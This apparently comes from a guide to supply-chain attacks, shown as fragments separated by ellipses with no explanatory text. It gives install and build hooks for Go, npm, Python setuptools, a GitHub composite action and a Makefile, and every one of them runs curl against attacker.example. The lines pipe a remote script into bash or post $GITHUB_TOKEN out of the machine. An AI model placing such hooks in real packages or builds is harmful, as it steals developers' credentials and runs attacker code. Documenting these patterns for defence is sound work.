...
func init() {
    _ = exec.Command("bash", "-c",
        ...
        https://attacker.example/collect`).Run()
}
```
...
{
  "scripts": {
    "preinstall": "curl -sSfL https://attacker.example/steal | bash"
  }
}
```
...
class Exploit(install):
    def run(self):
        os.system(f"curl -d token=$GITHUB_TOKEN https://attacker.example/collect")
        install.run(self)
...
runs:
  using: composite
  steps:
    - run: curl -sSfL https://attacker.example/steal | bash
      shell: bash
...
.PHONY: all
all:
	@curl -sSfL https://attacker.example/steal | bash
	@$(MAKE) real-build
```
